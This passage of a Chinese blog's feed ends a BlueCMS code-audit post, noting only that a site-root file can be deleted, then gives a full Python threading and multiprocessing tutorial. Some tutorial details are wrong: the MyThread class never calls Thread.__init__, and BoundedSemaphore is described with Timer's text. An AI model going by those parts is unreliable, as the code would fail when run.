src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt loading="lazy"></p><p>可删除网站根目录下的1.txt文件</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的&lt;/p&gt;
&lt;p&gt;BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的&lt;/p&gt;
    
    </summary>
    
    
      <category term="源码审计" scheme="https://www.extrader.top/categories/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="CMS" scheme="https://www.extrader.top/tags/CMS/"/>
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python-多线程编程</title>
    <link href="https://www.extrader.top/posts/64be7bf2/"/>
    <id>https://www.extrader.top/posts/64be7bf2/</id>
    <published>2020-04-10T10:01:26.000Z</published>
    <updated>2020-07-14T12:52:02.692Z</updated>
    
    <content type="html"><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p><table><thead><tr><th align="center">对象</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">表示一个执行线程的对象</td></tr><tr><td align="center">Lock</td><td align="center">锁原语对象</td></tr><tr><td align="center">RLock</td><td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td></tr><tr><td align="center">Condition</td><td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td></tr><tr><td align="center">Event</td><td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td></tr><tr><td align="center">Semaphore</td><td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Timer</td><td align="center">与Thread相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Barrier</td><td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td></tr></tbody></table><h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p><p><strong>Thread对象数据属性</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">线程名</td></tr><tr><td align="center">ident</td><td align="center">线程的标识符</td></tr><tr><td align="center">daemon</td><td align="center">布尔标志，表示这个线程是否是守护线程</td></tr></tbody></table><p><strong>Thread对象方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,verbose=None,daemon=None)</code></td><td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td></tr><tr><td align="center">start()</td><td align="center">开始执行该线程</td></tr><tr><td align="center">run()</td><td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td></tr></tbody></table><p>下面看一段可创建多线程的代码</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import sleep, ctimeloops &#x3D; [4, 2]def loop(nloop, nsec):    print(&quot;start loop&quot;, nloop, &quot;at :&quot;, ctime())    sleep(nsec)    print(&quot;loop&quot;, nloop, &quot;done at :&quot;, ctime())def main():    print(&quot;starting at:&quot;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; threading.Thread(target&#x3D;loop, args&#x3D;(i,loops[i]))  #target&#x3D;需要线程去执行的方法名   args&#x3D;线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号        threads.append(t)    for i in nloops:        print(threads[i])        threads[i].start() #线程等待启动    for i in nloops:        threads[i].join()  # 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭        print(threads[i])    print(&quot;all DONE at:&quot;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt loading="lazy"></p><p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctime, sleeploops &#x3D; [4, 2]class ThreadFunc(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func &#x3D; func        self.args &#x3D; args    def run(self):          #重写run方法,定义线程功能        self.func(*self.args)def loop(nloop, nsec):    print(&#39;start loop&#39;, nloop, &#39;at :&#39;, ctime())    sleep(nsec)    print(&#39;loop&#39;, nloop, &#39;done at :&#39;, ctime())def main():    print(&#39;starting at :&#39;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; ThreadFunc(loop, (i, loops[i]))        threads.append(t)    for i in nloops:        threads[i].start()    for i in nloops:        threads[i].join()    print(&#39;all DONE at :&#39;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctimeclass MyThread(threading.Thread):    def __init__(self,func,args,name &#x3D; &quot;&quot;):        self.name &#x3D; name        self.func &#x3D; func        self.args &#x3D; args    def getResult(self):        return self.res  #将结果保存后通过getResult方法获取返回值    def run(self):        print(&quot;starting&quot;, self.name, ctime())        self.res &#x3D; self.func(*self.args)        print(self.name, &quot;finished at :&quot;, ctime())</code></pre><h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><pre class="language-python" data-language="python"><code class="language-python">from myThread import MyThreadfrom time import ctime, sleepdef Fib(x):    sleep(0.005)    if x &lt; 3: return 1    return (Fib(x - 1) + Fib(x - 2))def Fac(x):    sleep(0.1)    if x &lt; 2: return 1    return (x * Fac(x - 1))def Sum(x):    sleep(0.1)    if x &lt; 2: return 1    return (x + Sum(x - 1))funcs &#x3D; [Fib, Fac, Sum]n &#x3D; 8def main():    nfuncs &#x3D; range(len(funcs))    for i in nfuncs:        print(&quot;starting&quot;, funcs[i].__name__, &quot;at :&quot;, ctime())        print(funcs[i](n))        print(funcs[i].__name__, &quot;finished at :&quot;, ctime())    print(&quot;\n *** MULTIPLE THREADS&quot;)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (n,), funcs[i].__name__)        threads.append(t)        for i in nfuncs:        threads[i].start()        for i in nfuncs:        threads[i].join()        print(threads[i].getResult())    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下，可见多线程处理的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt loading="lazy"></p><h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import Thread , Lock, current_threadfrom time import ctime, sleepclass CleanOutputSet(set):    def __str__(self):  #当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据        return &quot;, &quot;.join(x for x in self)#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回lock &#x3D; Lock()   #创建一个锁对象loops &#x3D; (randrange(2,5) for x in range(randrange(3,7)))#此行表示随机选取2-5的数字随机选3-7次remaining &#x3D; CleanOutputSet()def loop(nsec):    myname &#x3D; current_thread().name  #返回当前Thread对象的名字    lock.acquire()          #加锁    remaining.add(myname)   #add方法，如果不在集合中则添加    print(&quot;[&#123;&#125;] Started &#123;&#125;&quot;.format(ctime(),myname))    #print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()          #释放    sleep(nsec)    lock.acquire()    remaining.remove(myname)    print(&quot;[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)&quot;.format(ctime(),myname,nsec))    print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()def main():    for pause in loops:        Thread(target&#x3D;loop, args&#x3D;(pause,)).start()@register   #通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行def _atexit():     print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt loading="lazy"></p><p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p><h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import BoundedSemaphore, Lock, Threadfrom time import ctime, sleeplock &#x3D; Lock()MAX &#x3D; 5candytray &#x3D; BoundedSemaphore(MAX)def refill():    lock.acquire()    print(&quot;Refilling candy...&quot;,end&#x3D;&quot;&quot;)    try:        candytray.release()  #释放信号量，使内部计数器增加一，可以唤醒等待的线程    except ValueError:        print(&quot;full, skipping&quot;)    else:        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    lock.release()def buy():    lock.acquire()    print(&quot;Buying candy...&quot;,end&#x3D;&quot;&quot;)    if candytray.acquire(False):   # 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    else:        print(&quot;empty, skipping&quot;)    lock.release()def producer(loops):    for i in range(loops):        refill()        sleep(randrange(3))def consumer(loops):    for i in range(loops):        buy()        sleep(randrange(3))def main():    print(&quot;starting at :&#123;&#125;&quot;.format(ctime()))    nloops &#x3D; randrange(2,6)    print(&quot;THE CANDY MACHINE (full with &#123;&#125;)!&quot;.format(MAX))    Thread(target&#x3D;consumer, args&#x3D;(randrange(nloops, nloops + MAX + 2),)).start()    Thread(target&#x3D;producer, args&#x3D;(nloops,)).start()@registerdef _atexit():    print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p><code>acquire(blocking=布尔值,timeout=None)</code></p><ul><li>本方法用于获得Semaphore</li><li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li><li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li><li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li></ul><p><code>release()</code></p><ul><li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li></ul><p>结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt loading="lazy"></p><h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p><p><strong>类</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr></tbody></table><p><strong>异常</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">当对空队列调用get*()方法时抛出异常</td></tr><tr><td align="center">Full</td><td align="center">当对已满的队列调用put*()方法时抛出异常</td></tr></tbody></table><p><strong>方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td></tr><tr><td align="center">empty()</td><td align="center">如果队列为空，则返回True，否则返回False</td></tr><tr><td align="center">full()</td><td align="center">如果队列已满，则返回True，否则返回False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">和put(item,Flase)相同</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td></tr><tr><td align="center">get_nowait()</td><td align="center">和get(False)相同</td></tr><tr><td align="center">task_done()</td><td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td></tr><tr><td align="center">join()</td><td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td></tr></tbody></table><pre class="language-python" data-language="python"><code class="language-python">from time import sleepfrom queue import Queuefrom myThread import MyThreaddef writeQ(queue):    queue.put(&quot;xxx&quot;,1)    print(&quot;producing object for Q... &quot;,end&#x3D;&quot;&quot;)    print(&quot;size now &quot;,queue.qsize())def randQ(queue):    val &#x3D; queue.get()    print(&quot;consumed object from Q... size now &quot;, queue.qsize())def writer(queue, loops):   #写数据入队列    for i in range(loops):        writeQ(queue)def reader(queue, loops):   #从队列中取出数据    for i in range(loops):        randQ(queue)        sleep(2)            #添加延时便于观察funcs &#x3D; [reader, writer]nfuncs &#x3D; range(len(funcs))def main():    nloops &#x3D; 5    q &#x3D; Queue(32)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (q, nloops), funcs[i].__name__)        threads.append(t)    for i in nfuncs:        threads[i].start()    for i in nfuncs:        threads[i].join()    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt loading="lazy"></p><h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing">multiprocessing</a> — 基于进程的并行</p><pre class="language-python" data-language="python"><code class="language-python">from multiprocessing import Process, JoinableQueueimport timeimport randomdef consumer(q, name):    while True:        res &#x3D; q.get()  #从对列中取出并返回对象        time.sleep(random.randint(1, 3))        print(&#39;%s 吃掉了 %s&#39; % (name, res))        q.task_done()  #发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕def producer(q, name, food):    time.sleep(random.randint(1, 3))    res &#x3D; &#39;%s&#39; % (food)    q.put(res)  #将res放入队列    print(&#39;%s 生产了 %s&#39; % (name, res))    q.join()    # 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    q &#x3D; JoinableQueue()     # 使用JoinableQueue()    foods &#x3D; [&quot;包子&quot;,&quot;豆浆&quot;,&quot;油条&quot;,&quot;稀饭&quot;]    producerthreads &#x3D; []    consumerthreads &#x3D; []    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;producer, args&#x3D;(q, &#39;厨师&#39;, foods[i]))        producerthreads.append(t)        producerthreads[-1].start()    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;consumer, args&#x3D;(q, &#39;吃货&#39;))        consumerthreads.append(t)        consumerthreads[-1].daemon &#x3D; True        consumerthreads[-1].start()    for i in range(len(producerthreads)):        producerthreads[i].join()    # 1、主进程等生产者p1,p2,p3结束    # 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束    # 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程    print(&quot;END&quot;)</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;threading模块&quot;&gt;&lt;a href=&quot;#threading模块&quot; class=&quot;headerlink&quot; title=&quot;threading模块&quot;&gt;&lt;/a&gt;threading模块&lt;/h3&gt;&lt;p&gt;可用对象列表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;t
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
</feed>
